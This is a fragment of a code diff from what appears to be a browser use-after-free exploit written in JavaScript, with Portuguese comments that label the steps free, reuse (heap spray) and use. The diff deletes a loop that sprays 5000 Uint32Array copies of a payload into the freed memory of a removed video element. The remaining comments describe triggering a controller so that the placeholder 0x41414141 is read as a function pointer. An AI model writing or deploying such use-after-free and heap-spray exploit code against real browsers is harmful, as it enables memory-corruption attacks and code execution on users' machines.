@@ -38,14 +38,7 @@ export default {
             // 1. FREE: Apagamos o vídeo
             this.video.remove();
 
-            // 2. REUSE (SPRAY): Tentamos preencher o buraco deixado pelo vídeo
-            // com 5000 cópias do nosso payload o mais rápido possível
-            this.spray = [];
-            for (let i = 0; i < 5000; i++) {
-                let arr = new Uint32Array(256);
-                arr.set(this.sprayPayload);
-                this.spray.push(arr);
-            }
+            
 
             // 3. USE: Disparamos o controlador. 
             // Se ele ler o nosso 0x41414141 como se fosse um ponteiro de função,
